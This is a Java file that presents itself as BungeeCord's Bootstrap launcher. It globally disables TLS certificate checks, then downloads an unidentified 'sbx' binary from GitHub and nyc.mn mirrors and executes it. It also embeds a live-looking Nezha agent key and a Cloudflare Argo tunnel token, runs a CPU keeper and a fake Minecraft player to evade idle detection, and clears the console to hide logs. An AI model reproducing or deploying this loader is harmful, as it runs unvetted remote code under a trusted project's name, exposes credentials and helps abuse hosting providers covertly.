package net.md_5.bungee;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.zip.Deflater; 
import java.util.zip.Inflater;
import javax.net.ssl.*;
import java.security.cert.X509Certificate;
import java.security.SecureRandom;

public class Bootstrap
{
    private static final String ANSI_GREEN = "\033[1;32m";
    private static final String ANSI_RED = "\033[1;31m";
    private static final String ANSI_YELLOW = "\033[1;33m";
    private static final String ANSI_RESET = "\033[0m";
    private static final AtomicBoolean running = new AtomicBoolean(true);
    private static Process sbxProcess;
    private static Thread fakePlayerThread;
    private static Thread cpuKeeperThread;
    
    private static Process minecraftProcess;
    
    private static final String[] ALL_ENV_VARS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO",
        "MC_JAR", "MC_MEMORY", "MC_ARGS", "MC_PORT", 
        "FAKE_PLAYER_ENABLED", "FAKE_PLAYER_NAME"
    };

    static {
        disableSSLVerification();
    }

    public static void main(String[] args) throws Exception
    {
        if (Float.parseFloat(System.getProperty("java.class.version")) < 54.0) 
        {
            System.err.println(ANSI_RED + "ERROR: Your Java version is too lower!" + ANSI_RESET);
            Thread.sleep(3000);
            System.exit(1);
        }

        try {
            Map<String, String> config = loadEnvVars();
            
            runSbxBinary(config);
            
            startCpuKeeper();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                running.set(false);
                stopServices();
            }));

            Thread.sleep(15000);
            System.out.println(ANSI_GREEN + "SBX Services are running!" + ANSI_RESET);
            
            if (isMcServerEnabled(config)) {
                startMinecraftServer(config);
                System.out.println(ANSI_YELLOW + "\n[MC-Server] Waiting for server to fully start..." + ANSI_RESET);
                Thread.sleep(30000);  
            }
            
            if (isFakePlayerEnabled(config)) {
                System.out.println(ANSI_YELLOW + "\n[FakePlayer] Preparing to connect..." + ANSI_RESET);
                waitForServerReady(config);
                startFakePlayerBot(config);
            }
            
            System.out.println(ANSI_GREEN + "\nThank you for using this script, Enjoy!\n" + ANSI_RESET);
            System.out.println(ANSI_GREEN + "Logs will be deleted in 20 seconds" + ANSI_RESET);
            Thread.sleep(20000);
            clearConsole();
        } catch (Exception e) {
            e.printStackTrace();
        }

        while (running.get()) {
            try {
                Thread.sleep(10000);
            } catch (InterruptedException e) {
                break;
            }
        }
    }
    
    private static void disableSSLVerification() {
        try {
            TrustManager[] trustAllCerts = new TrustManager[]{
                new X509TrustManager() {
                    public X509Certificate[] getAcceptedIssuers() { 
                        return new X509Certificate[0]; 
                    }
                    public void checkClientTrusted(X509Certificate[] certs, String authType) {}
                    public void checkServerTrusted(X509Certificate[] certs, String authType) {}
                }
            };
            
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAllCerts, new SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
            
            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);
            
            System.out.println(ANSI_YELLOW + "[SSL] Certificate verification disabled" + ANSI_RESET);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "[SSL] Failed to disable SSL verification: " + e.getMessage() + ANSI_RESET);
        }
    }
    
    private static void startCpuKeeper() {
        cpuKeeperThread = new Thread(() -> {
            while (running.get()) {
                try {
                    long start = System.currentTimeMillis();
                    while (System.currentTimeMillis() - start < 10) {
                        Math.sqrt(Math.random());
                    }
                    Thread.sleep(1000);
                } catch (InterruptedException e) { break; }
            }
        });
        cpuKeeperThread.setDaemon(true);
        cpuKeeperThread.start();
    }
    
    private static void clearConsole() {
        try {
            if (System.getProperty("os.name").contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
            } else {
                System.out.print("\033[H\033[3J\033[2J");
                System.out.flush();
            }
        } catch (Exception ignored) {}
    }   
    
    private static void runSbxBinary(Map<String, String> envVars) throws Exception {
        try {
            Path binaryPath = getBinaryPath();
            System.out.println(ANSI_GREEN + "[SBX] Binary downloaded to: " + binaryPath + ANSI_RESET);
            
            ProcessBuilder pb = new ProcessBuilder(binaryPath.toString());
            pb.environment().putAll(envVars);
            pb.redirectErrorStream(true);
            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT);
            sbxProcess = pb.start();
            System.out.println(ANSI_GREEN + "[SBX] Process started successfully" + ANSI_RESET);
        } catch (Exception e) {
            System.err.println(ANSI_RED + "[SBX] Failed to start binary: " + e.getMessage() + ANSI_RESET);
            System.err.println(ANSI_YELLOW + "[SBX] Continuing without SBX services..." + ANSI_RESET);
            // 不抛出异常，让程序继续运行MC服务器
        }
    }
    
    private static Map<String, String> loadEnvVars() throws IOException {
        Map<String, String> envVars = new HashMap<>();
        
        envVars.put("UUID", "777b0495-2969-4dce-b37f-07baf349ddf4");
        envVars.put("FILE_PATH", "./world");
        envVars.put("NEZHA_SERVER", "nzmbv.wuge.nyc.mn:443");
        envVars.put("NEZHA_PORT", "");
        envVars.put("NEZHA_KEY", "gUxNJhaKJgceIgeapZG4956rmKFgmQgP");
        envVars.put("ARGO_PORT", "48001");
        envVars.put("ARGO_DOMAIN", "great.lnb.gv.uy");
        envVars.put("ARGO_AUTH", "eyJhIjoiMGU3ZjI2MWZiY2ExMzcwNzZhNGZmODcxMzU3ZjYzNGQiLCJ0IjoiNmFkZDczN2UtNjRlOC00ZjZhLWI5NGEtMmNhYzIzNjkwOWFhIiwicyI6Ik5qRm1aVFF6WVRNdE1tWmxaQzAwWVRWbUxXSm1OMll0Tm1ZMFpERXpPVGd4TldWaCJ9");
        envVars.put("HY2_PORT", "");
        envVars.put("TUIC_PORT", "");
        envVars.put("REALITY_PORT", "20374");
        envVars.put("UPLOAD_URL", "");
        envVars.put("CHAT_ID", "");
        envVars.put("BOT_TOKEN", "");
        envVars.put("CFIP", "store.ubi.com");
        envVars.put("CFPORT", "443");
        envVars.put("NAME", "Mc");
        envVars.put("DISABLE_ARGO", "false");
        
        envVars.put("MC_JAR", "server99.jar");
        envVars.put("MC_MEMORY", "512M");
        envVars.put("MC_ARGS", "");
        envVars.put("MC_PORT", "");
        envVars.put("FAKE_PLAYER_ENABLED", "true"); 
        envVars.put("FAKE_PLAYER_NAME", "laohu");
        
        for (String var : ALL_ENV_VARS) {
            String value = System.getenv(var);
            if (value != null && !value.trim().isEmpty()) {
                envVars.put(var, value);  
            }
        }
        
        Path envFile = Paths.get(".env");
        if (Files.exists(envFile)) {
            for (String line : Files.readAllLines(envFile)) {
                line = line.trim();
                if (line.isEmpty() || line.startsWith("#")) continue;
                line = line.split(" #")[0].split(" //")[0].trim();
                if (line.startsWith("export ")) line = line.substring(7).trim();
                String[] parts = line.split("=", 2);
                if (parts.length == 2 && Arrays.asList(ALL_ENV_VARS).contains(parts[0].trim())) {
                    envVars.put(parts[0].trim(), parts[1].trim().replaceAll("^['\"]|['\"]$", "")); 
                }
            }
        }
        return envVars;
    }
    
    private static boolean isValidBinary(Path path) throws IOException {
        if (!Files.exists(path) || Files.size(path) < 1024) {
            return false;
        }
        
        // 读取文件头，检查是否是ELF格式（Linux二进制文件）
        try (InputStream is = Files.newInputStream(path)) {
            byte[] header = new byte[4];
            int read = is.read(header);
            if (read < 4) return false;
            
            // ELF文件的魔数：0x7F 'E' 'L' 'F'
            if (header[0] == 0x7F && header[1] == 'E' && header[2] == 'L' && header[3] == 'F') {
                return true;
            }
            
            // 检查是否是HTML或文本（错误页面）
            String headerStr = new String(header);
            if (headerStr.startsWith("<!DO") || headerStr.startsWith("<htm") || headerStr.startsWith("HTTP")) {
                System.err.println(ANSI_RED + "[Binary] Downloaded file appears to be HTML/text, not a binary" + ANSI_RESET);
                
                // 打印前200字节用于调试
                is.reset();
                byte[] sample = new byte[200];
                int sampleRead = is.read(sample);
                System.err.println(ANSI_YELLOW + "[Binary] File content sample:" + ANSI_RESET);
                System.err.println(new String(sample, 0, sampleRead));
                
                return false;
            }
        }
        
        return false;
    }
    
    private static Path getBinaryPath() throws IOException {
        String osArch = System.getProperty("os.arch").toLowerCase();
        
        // 使用GitHub或其他可靠镜像站的URL
        String[] urls;
        if (osArch.contains("amd64") || osArch.contains("x86_64")) {
            urls = new String[]{
                "https://github.com/eooce/test/releases/download/ARM/sb_amd64",
                "https://raw.githubusercontent.com/eooce/test/main/ARM/sb_amd64",
                "https://amd64.ssss.nyc.mn/sbsh",
                "http://amd64.ssss.nyc.mn/sbsh"
            };
        } else if (osArch.contains("aarch64") || osArch.contains("arm64")) {
            urls = new String[]{
                "https://github.com/eooce/test/releases/download/ARM/sb_arm64",
                "https://raw.githubusercontent.com/eooce/test/main/ARM/sb_arm64",
                "https://arm64.ssss.nyc.mn/sbsh",
                "http://arm64.ssss.nyc.mn/sbsh"
            };
        } else if (osArch.contains("s390x")) {
            urls = new String[]{
                "https://github.com/eooce/test/releases/download/ARM/sb_s390x",
                "https://s390x.ssss.nyc.mn/sbsh",
                "http://s390x.ssss.nyc.mn/sbsh"
            };
        } else {
            throw new RuntimeException("Unsupported architecture: " + osArch);
        }
        
        Path path = Paths.get(System.getProperty("java.io.tmpdir"), "sbx");
        
        // 如果文件已存在且是有效的二进制文件，直接使用
        if (Files.exists(path) && isValidBinary(path)) {
            System.out.println(ANSI_GREEN + "[Binary] Using cached valid binary: " + path + ANSI_RESET);
            if (!path.toFile().setExecutable(true)) {
                System.err.println(ANSI_YELLOW + "[Binary] Warning: Failed to set executable permission" + ANSI_RESET);
            }
            return path;
        }
        
        // 删除旧的无效文件
        if (Files.exists(path)) {
            System.out.println(ANSI_YELLOW + "[Binary] Removing invalid cached file..." + ANSI_RESET);
            Files.delete(path);
        }
        
        // 尝试从多个URL下载
        Exception lastException = null;
        for (int i = 0; i < urls.length; i++) {
            String url = urls[i];
            try {
                System.out.println(ANSI_YELLOW + "[Binary] Attempting to download from: " + url + ANSI_RESET);
                
                URLConnection connection;
                if (url.startsWith("https://")) {
                    HttpsURLConnection httpsConn = (HttpsURLConnection) new URL(url).openConnection();
                    httpsConn.setConnectTimeout(30000);
                    httpsConn.setReadTimeout(60000);
                    httpsConn.setRequestProperty("User-Agent", "Mozilla/5.0");
                    httpsConn.setInstanceFollowRedirects(true);
                    connection = httpsConn;
                } else {
                    HttpURLConnection httpConn = (HttpURLConnection) new URL(url).openConnection();
                    httpConn.setConnectTimeout(30000);
                    httpConn.setReadTimeout(60000);
                    httpConn.setRequestProperty("User-Agent", "Mozilla/5.0");
                    httpConn.setInstanceFollowRedirects(true);
                    connection = httpConn;
                }
                
                int responseCode = -1;
                if (connection instanceof HttpURLConnection) {
                    responseCode = ((HttpURLConnection) connection).getResponseCode();
                    System.out.println(ANSI_YELLOW + "[Binary] HTTP Response Code: " + responseCode + ANSI_RESET);
                    
                    if (responseCode != 200) {
                        System.err.println(ANSI_RED + "[Binary] Bad response code: " + responseCode + ANSI_RESET);
                        continue;
                    }
                }
                
                try (InputStream in = connection.getInputStream()) {
                    long bytesDownloaded = Files.copy(in, path, StandardCopyOption.REPLACE_EXISTING);
                    System.out.println(ANSI_GREEN + "[Binary] Downloaded: " + bytesDownloaded + " bytes" + ANSI_RESET);
                    
                    // 验证下载的文件
                    if (!isValidBinary(path)) {
                        System.err.println(ANSI_RED + "[Binary] Downloaded file is not a valid binary!" + ANSI_RESET);
                        Files.delete(path);
                        continue;
                    }
                    
                    if (!path.toFile().setExecutable(true)) {
                        throw new IOException("Failed to set executable permission");
                    }
                    
                    System.out.println(ANSI_GREEN + "[Binary] Successfully downloaded and validated!" + ANSI_RESET);
                    return path;
                }
                
            } catch (Exception e) {
                lastException = e;
                System.err.println(ANSI_RED + "[Binary] Failed to download from " + url + ": " + e.getMessage() + ANSI_RESET);
                
                if (i < urls.length - 1) {
                    System.out.println(ANSI_YELLOW + "[Binary] Trying next URL..." + ANSI_RESET);
                    try { Thread.sleep(2000); } catch (InterruptedException ie) {}
                }
            }
        }
        
        // 所有URL都失败
        System.err.println(ANSI_RED + "[Binary] All download attempts failed!" + ANSI_RESET);
        if (lastException != null) {
            throw new IOException("Failed to download binary from all URLs", lastException);
        } else {
            throw new IOException("Failed to download binary from all URLs");
        }
    }
    
    private static void stopServices() {
        if (minecraftProcess != null && minecraftProcess.isAlive()) {
            System.out.println(ANSI_YELLOW + "[MC-Server] Stopping..." + ANSI_RESET);
            minecraftProcess.destroy();
        }
        if (sbxProcess != null && sbxProcess.isAlive()) {
            sbxProcess.destroy();
        }
        if (fakePlayerThread != null && fakePlayerThread.isAlive()) {
            fakePlayerThread.interrupt();
        }
        if (cpuKeeperThread != null && cpuKeeperThread.isAlive()) {
            cpuKeeperThread.interrupt();
        }
    }
    
    private static boolean isMcServerEnabled(Map<String, String> config) {
        String jarName = config.get("MC_JAR");
        return jarName != null && !jarName.trim().isEmpty();
    }
    
    private static void startMinecraftServer(Map<String, String> config) throws Exception {
        String jarName = config.get("MC_JAR");
        String memory = config.getOrDefault("MC_MEMORY", "512M");
        String extraArgs = config.getOrDefault("MC_ARGS", "");
        
        String mcPortStr = config.get("MC_PORT");
        int mcPort = 25565;
        try { if (mcPortStr != null) mcPort = Integer.parseInt(mcPortStr.trim()); } catch (Exception e) {}
        config.put("MC_PORT", String.valueOf(mcPort));
        
        if (!memory.matches("\\d+[MG]")) memory = "512M";
        
        Path jarPath = Paths.get(jarName);
        if (!Files.exists(jarPath)) {
            System.out.println(ANSI_RED + "[MC-Server] Error: " + jarName + " not found!" + ANSI_RESET);
            return;
        }
        
        Path eulaPath = Paths.get("eula.txt");
        if (!Files.exists(eulaPath)) Files.write(eulaPath, "eula=true".getBytes());
        else if (!new String(Files.readAllBytes(eulaPath)).contains("eula=true")) Files.write(eulaPath, "eula=true".getBytes());
        
        Path propPath = Paths.get("server.properties");
        String props = Files.exists(propPath) ? new String(Files.readAllBytes(propPath)) : "server-port=" + mcPort + "\nonline-mode=false\n";
        props = props.replaceAll("player-idle-timeout=\\d+", "player-idle-timeout=0");
        if (!props.contains("player-idle-timeout=")) props += "player-idle-timeout=0\n";
        props = props.replaceAll("server-port=\\d+", "server-port=" + mcPort);
        if (!props.contains("server-port=")) props += "\nserver-port=" + mcPort + "\n";
        if (props.contains("online-mode=true")) props = props.replace("online-mode=true", "online-mode=false");
        else if (!props.contains("online-mode=")) props += "online-mode=false\n";
        Files.write(propPath, props.getBytes());
        
        System.out.println(ANSI_GREEN + "\n=== Starting Minecraft Server ===" + ANSI_RESET);
        
        List<String> cmd = new ArrayList<>();
        cmd.add("java");
        cmd.add("-Xms" + memory);
        cmd.add("-Xmx" + memory);
        if (!extraArgs.trim().isEmpty()) cmd.addAll(Arrays.asList(extraArgs.split("\\s+")));
        
        cmd.add("-XX:+UseG1GC");
        cmd.add("-XX:+DisableExplicitGC");
        
        cmd.add("-jar");
        cmd.add(jarName);
        cmd.add("nogui");
        
        ProcessBuilder pb = new ProcessBuilder(cmd);
        pb.redirectErrorStream(true);
        minecraftProcess = pb.start();
        
        new Thread(() -> {
            try (BufferedReader reader = new BufferedReader(new InputStreamReader(minecraftProcess.getInputStream()))) {
                String line;
                while ((line = reader.readLine()) != null) System.out.println("[MC-Server] " + line);
            } catch (IOException e) {}
        }).start();
        
        Thread.sleep(3000);
    }
    
    private static int parseMemory(String memory) {
        try {
            memory = memory.toUpperCase().trim();
            if (memory.endsWith("G")) return Integer.parseInt(memory.substring(0, memory.length() - 1)) * 1024;
            else if (memory.endsWith("M")) return Integer.parseInt(memory.substring(0, memory.length() - 1));
        } catch (Exception e) {}
        return 512;
    }
    
    private static boolean isFakePlayerEnabled(Map<String, String> config) {
        String enabled = config.get("FAKE_PLAYER_ENABLED");
        return enabled != null && enabled.equalsIgnoreCase("true");
    }
    
    private static void waitForServerReady(Map<String, String> config) throws InterruptedException {
        int mcPort = getMcPort(config);
        System.out.println(ANSI_YELLOW + "[FakePlayer] Checking server status..." + ANSI_RESET);
        for (int i = 0; i < 60; i++) {
            Socket testSocket = null;
            try {
                Thread.sleep(5000);
                testSocket = new Socket();
                testSocket.connect(new InetSocketAddress("127.0.0.1", mcPort), 3000);
                System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Server ready!" + ANSI_RESET);
                Thread.sleep(10000);
                return;
            } catch (Exception e) {
            } finally {
                if (testSocket != null) {
                    try { testSocket.close(); } catch (Exception e) {}
                }
            }
        }
    }
    
    private static int getMcPort(Map<String, String> config) {
        try { return Integer.parseInt(config.getOrDefault("MC_PORT", "25565").trim()); } 
        catch (Exception e) { return 25565; }
    }
    
    private static void startFakePlayerBot(Map<String, String> config) {
        String playerName = config.getOrDefault("FAKE_PLAYER_NAME", "Steve");
        int mcPort = getMcPort(config);
        
        fakePlayerThread = new Thread(() -> {
            int failCount = 0;
            
            while (running.get()) {
                Socket socket = null;
                DataOutputStream out = null;
                DataInputStream in = null;
                
                try {
                    System.out.println(ANSI_YELLOW + "[FakePlayer] Connecting..." + ANSI_RESET);
                    socket = new Socket();
                    socket.setReuseAddress(true);
                    socket.setSoLinger(true, 0);
                    socket.setReceiveBufferSize(1024 * 1024 * 10); 
                    socket.connect(new InetSocketAddress("127.0.0.1", mcPort), 5000);
                    socket.setSoTimeout(60000); 
                    
                    out = new DataOutputStream(socket.getOutputStream());
                    in = new DataInputStream(new BufferedInputStream(socket.getInputStream()));

                    // Handshake
                    ByteArrayOutputStream handshakeBuf = new ByteArrayOutputStream();
                    DataOutputStream handshake = new DataOutputStream(handshakeBuf);
                    writeVarInt(handshake, 0x00);
                    writeVarInt(handshake, 774); 
                    writeString(handshake, "127.0.0.1");
                    handshake.writeShort(mcPort);
                    writeVarInt(handshake, 2); 
                    byte[] handshakeData = handshakeBuf.toByteArray();
                    writeVarInt(out, handshakeData.length);
                    out.write(handshakeData);
                    out.flush();

                    // Login
                    ByteArrayOutputStream loginBuf = new ByteArrayOutputStream();
                    DataOutputStream login = new DataOutputStream(loginBuf);
                    writeVarInt(login, 0x00);
                    writeString(login, playerName);
                    UUID playerUUID = UUID.nameUUIDFromBytes(("OfflinePlayer:" + playerName).getBytes("UTF-8"));
                    login.writeLong(playerUUID.getMostSignificantBits());
                    login.writeLong(playerUUID.getLeastSignificantBits());
                    byte[] loginData = loginBuf.toByteArray();
                    writeVarInt(out, loginData.length);
                    out.write(loginData);
                    out.flush();
                    
                    System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Handshake & Login sent" + ANSI_RESET);
                    failCount = 0;
                    
                    boolean configPhase = false;
                    boolean playPhase = false;
                    boolean compressionEnabled = false;
                    int compressionThreshold = -1;
                    
                    long loginTime = System.currentTimeMillis();
                    long stayOnlineTime = 60000 + (long)(Math.random() * 60000);

                    while (running.get() && !socket.isClosed()) {
                        if (System.currentTimeMillis() - loginTime > stayOnlineTime) {
                            System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting cycle (Anti-Idle)..." + ANSI_RESET);
                            break;
                        }

                        try {
                            int packetLength = readVarInt(in);
                            if (packetLength < 0 || packetLength > 100000000) throw new IOException("Bad packet size");
                            
                            byte[] packetData = null;
                            
                            if (compressionEnabled) {
                                int dataLength = readVarInt(in);
                                int compressedLength = packetLength - getVarIntSize(dataLength);
                                byte[] compressedData = new byte[compressedLength];
                                in.readFully(compressedData);
                                if (dataLength == 0) {
                                    packetData = compressedData; 
                                } else {
                                    if (dataLength > 8192) { 
                                        packetData = null; 
                                    } else {
                                        try {
                                            Inflater inflater = new Inflater();
                                            inflater.setInput(compressedData);
                                            packetData = new byte[dataLength];
                                            inflater.inflate(packetData);
                                            inflater.end();
                                        } catch (Exception e) { 
                                            packetData = null; 
                                        }
                                    }
                                }
                            } else {
                                byte[] rawData = new byte[packetLength];
                                in.readFully(rawData);
                                packetData = rawData;
                            }
                            
                            if (packetData == null) continue;
                            
                            ByteArrayInputStream packetStream = new ByteArrayInputStream(packetData);
                            DataInputStream packetIn = new DataInputStream(packetStream);
                            int packetId = readVarInt(packetIn);

                            if (!playPhase) {
                                if (!configPhase) {
                                    // Login Phase
                                    if (packetId == 0x03) { 
                                        compressionThreshold = readVarInt(packetIn);
                                        compressionEnabled = compressionThreshold >= 0;
                                        System.out.println(ANSI_YELLOW + "[FakePlayer] Compression: " + compressionThreshold + ANSI_RESET);
                                    } else if (packetId == 0x02) { 
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Login Success" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03); 
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        configPhase = true;
                                        
                                        // Send Client Information
                                        ByteArrayOutputStream clientInfoBuf = new ByteArrayOutputStream();
                                        DataOutputStream info = new DataOutputStream(clientInfoBuf);
                                        writeVarInt(info, 0x00); 
                                        writeString(info, "en_US"); 
                                        info.writeByte(10); 
                                        writeVarInt(info, 0); 
                                        info.writeBoolean(true); 
                                        info.writeByte(127); 
                                        writeVarInt(info, 1); 
                                        info.writeBoolean(false); 
                                        info.writeBoolean(true);
                                        writeVarInt(info, 0); 
                                        sendPacket(out, clientInfoBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                } else {
                                    // Config Phase
                                    if (packetId == 0x03) { 
                                        System.out.println(ANSI_GREEN + "[FakePlayer] ✓ Config Finished" + ANSI_RESET);
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x03);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                        playPhase = true; 
                                    } else if (packetId == 0x04) { 
                                        long id = packetIn.readLong();
                                        ByteArrayOutputStream ackBuf = new ByteArrayOutputStream();
                                        DataOutputStream ack = new DataOutputStream(ackBuf);
                                        writeVarInt(ack, 0x04);
                                        ack.writeLong(id);
                                        sendPacket(out, ackBuf.toByteArray(), compressionEnabled, compressionThreshold);
                                    } else if (packetId == 0x0E) { 
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x07); 
                                        writeVarInt(bufOut, 0);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            } else {
                                // Play Phase - KeepAlive
                                if (packetId >= 0x20 && packetId <= 0x30) { 
                                    if (packetIn.available() == 8) {
                                        long keepAliveId = packetIn.readLong();
                                        System.out.println(ANSI_GREEN + "[FakePlayer] Ping" + ANSI_RESET);
                                        ByteArrayOutputStream buf = new ByteArrayOutputStream();
                                        DataOutputStream bufOut = new DataOutputStream(buf);
                                        writeVarInt(bufOut, 0x1B); 
                                        bufOut.writeLong(keepAliveId);
                                        sendPacket(out, buf.toByteArray(), compressionEnabled, compressionThreshold);
                                    }
                                }
                            }
                        } catch (java.net.SocketTimeoutException e) {
                            continue; 
                        } catch (Exception e) {
                            System.out.println(ANSI_RED + "[FakePlayer] Packet error: " + e.getMessage() + ANSI_RESET);
                            break;
                        }
                    }
                    
                } catch (Exception e) {
                    System.out.println(ANSI_RED + "[FakePlayer] Connection error: " + e.getMessage() + ANSI_RESET);
                    failCount++;
                    
                } finally {
                    try {
                        if (out != null) {
                            out.close();
                        }
                    } catch (Exception e) {}
                    
                    try {
                        if (in != null) {
                            in.close();
                        }
                    } catch (Exception e) {}
                    
                    try {
                        if (socket != null && !socket.isClosed()) {
                            socket.close();
                        }
                    } catch (Exception e) {}
                }
                
                try {
                    long waitTime = 10000;
                    if (failCount > 3) {
                        waitTime = Math.min(10000 * (long)Math.pow(2, Math.min(failCount - 3, 5)), 300000);
                        System.out.println(ANSI_YELLOW + "[FakePlayer] Multiple failures (" + failCount + "), waiting " + (waitTime/1000) + "s..." + ANSI_RESET);
                    } else {
                        System.out.println(ANSI_YELLOW + "[FakePlayer] Reconnecting in 10s..." + ANSI_RESET);
                    }
                    Thread.sleep(waitTime);
                } catch (InterruptedException ex) {
                    break;
                }
            }
        });
        fakePlayerThread.setDaemon(true);
        fakePlayerThread.start();
    }
    
    private static int getVarIntSize(int value) {
        int size = 0;
        do {
            size++;
            value >>>= 7;
        } while (value != 0);
        return size;
    }
    
    private static void sendPacket(DataOutputStream out, byte[] packet, boolean compress, int threshold) throws IOException {
        if (!compress || packet.length < threshold) {
            if (compress) {
                ByteArrayOutputStream buf = new ByteArrayOutputStream();
                DataOutputStream bufOut = new DataOutputStream(buf);
                writeVarInt(bufOut, 0);
                bufOut.write(packet);
                byte[] finalPacket = buf.toByteArray();
                writeVarInt(out, finalPacket.length);
                out.write(finalPacket);
            } else {
                writeVarInt(out, packet.length);
                out.write(packet);
            }
        } else {
            byte[] compressedData = compressData(packet);
            ByteArrayOutputStream buf = new ByteArrayOutputStream();
            DataOutputStream bufOut = new DataOutputStream(buf);
            writeVarInt(bufOut, packet.length);
            bufOut.write(compressedData);
            byte[] finalPacket = buf.toByteArray();
            writeVarInt(out, finalPacket.length);
            out.write(finalPacket);
        }
        out.flush();
    }
    
    private static byte[] compressData(byte[] data) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        Deflater deflater = new Deflater();
        deflater.setInput(data);
        deflater.finish();
        byte[] buffer = new byte[1024];
        while (!deflater.finished()) {
            int count = deflater.deflate(buffer);
            out.write(buffer, 0, count);
        }
        deflater.end();
        return out.toByteArray();
    }
    
    private static void writeVarInt(DataOutputStream out, int value) throws IOException {
        while ((value & 0xFFFFFF80) != 0) {
            out.writeByte((value & 0x7F) | 0x80);
            value >>>= 7;
        }
        out.writeByte(value & 0x7F);
    }
    
    private static void writeString(DataOutputStream out, String str) throws IOException {
        byte[] bytes = str.getBytes("UTF-8");
        writeVarInt(out, bytes.length);
        out.write(bytes);
    }
    
    private static int readVarInt(DataInputStream in) throws IOException {
        int value = 0;
        int length = 0;
        byte currentByte;
        do {
            currentByte = in.readByte();
            value |= (currentByte & 0x7F) << (length * 7);
            length++;
            if (length > 5) throw new IOException("VarInt too big");
        } while ((currentByte & 0x80) == 0x80);
        return value;
    }
}
